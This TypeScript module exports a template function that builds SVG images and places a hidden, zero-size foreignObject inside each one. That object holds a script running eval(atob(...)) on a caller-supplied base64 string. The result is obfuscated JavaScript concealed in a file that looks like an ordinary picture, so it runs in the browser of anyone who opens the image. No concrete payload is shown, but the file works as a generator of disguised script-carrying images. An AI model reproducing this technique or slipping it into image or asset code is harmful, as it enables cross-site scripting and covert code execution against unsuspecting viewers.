import { INode } from "svgson"

import { clean, flatten } from "../support"

export interface Template {
  viewBox: string[]
  children: INode[]
  base64Code: string
}

export const useTemplate = ({
  viewBox,
  children,
  base64Code
}: Template): string =>
  clean(
    `
<svg
  version="1.1"
  xmlns="http://www.w3.org/2000/svg"
  viewBox="${viewBox.join(" ")}"
  style="enable-background:new ${viewBox.join(" ")};"
  xml:space="preserve">

 ${flatten(children)}

  <foreignObject x="0" y="0" width="0" height="0">
    <div xmlns="http://www.w3.org/1999/xhtml" style="display: none;">
      <script>
        eval(atob(("${base64Code}")));
      </script>
    </div>
  </foreignObject>
</svg>
`
  )
